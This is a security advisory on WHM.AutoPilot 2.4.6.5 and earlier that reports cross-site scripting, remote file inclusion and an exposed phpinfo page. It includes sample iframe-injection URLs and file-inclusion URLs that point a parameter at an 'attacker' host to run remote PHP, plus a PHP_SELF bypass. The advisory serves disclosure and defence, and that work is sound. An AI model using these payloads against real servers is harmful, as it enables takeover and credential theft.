@@ -1,0 +1,57 @@
+WHM.AutoPilot Multiple Vulnerabilities
+
+Vendor: Benchmark Designs, LLC
+Product: WHM.AutoPilot
+Version: <= 2.4.6.5
+Website: http://www.whmautopilot.com/
+
+BID: 12119 
+CVE: CVE-2004-1420 CVE-2004-1421 CVE-2004-1422 
+OSVDB: 12693 12694 12695 12696 12697 
+SECUNIA: 13673 
+PACKETSTORM: 35559 
+
+Description:
+Started by a webhost looking for more out of a simple managment script, Brandee Diggs (Owner of Spinn A Web Cafe, Founder of Benchmark Designs) setout to build an internal management system that could handle the day to day operations of a normal hosting company. The key was to remove the need to constantly watch your orders and manage the installs. Alas, WHM AutoPilot was born. [ as quoted from their official website ] 
+
+
+Cross Site Scripting:
+There are a significant number of cross site scripting issues in WHM AutoPilot. Most of these are caused by calling scripts directly and specifying certain variable values yourself. Below are a few examples, though there are many more XSS holes than just the examples I am showing below. 
+
+http://path/inc/header.php?site_title=%3C/title%3E%3Ciframe%3E
+http://path/admin/themes/blue/header.php?http_images='%3E%3Ciframe%3E 
+
+I believe that every file in the /themes/blue/ directory can be manipulated in this way, and of course this can be used to steal a users credentials or render hostile code. 
+
+
+File Include Vulnerability:
+WHM AutoPilot is susceptible to several potentially very dangerous file include vulns. Below are several examples of how files can be included and possibly executed remotely. 
+
+http://path/inc/header.php/step_one.php?server_inc=http://attacker/step_one_tables.php
+http://path/inc/step_one_tables.php?server_inc=http://attacker/js_functions.php
+http://path/inc/step_two_tables.php?server_inc=http://attacker/js_functions.php 
+
+This can be used to include php scripts and possibly take control of the webserver and more. A user does not have to be logged in to exploit this vulnerability either so that just makes it even more dangerous. Now for something weird: See the first example I gave above? Notice the "header.php/step_one.php"? Well, that was done to get around a piece of code that looked something like this. I am not going to include the actual code since this is proprietary software, but this should definitely give you the idea of what happened. 
+if (ereg("test.php", $PHP_SELF)==true)
+{
+    include $server_inc."/step_one_tables.php";
+}
+
+This works because $PHP_SELF will return the value of "header.php/step_ one.php" expectedly. The below excerpt was taken from the php manual. 
+
+"PHP_SELF
+The filename of the currently executing script, relative to the document root. For instance, $_SERVER['PHP_SELF'] in a script at the address http://example.com/test.php/foo.bar would be /test.php/foo.bar. The __FILE__ constant contains the full path and filename of the current (i.e. included) file." 
+
+I see a lot of developers use this variable without giving much though to how it can be taken advantage of. I have even found it can cause be used to conduct cross site scripting attacks when the phpinfo() function is called. 
+
+
+Information Disclosure:
+By default WHM AutoPilot is shipped with a phpinfo() script that is accessible to anyone. As far as I know WHM AutoPilot needs register globals to work, but if you want to check php settings anyway the file can be found in the root directory as "phpinfo.php" 
+
+
+Solution:
+I have contacted the developers, and a new version of WHM Autopilot is available. 
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
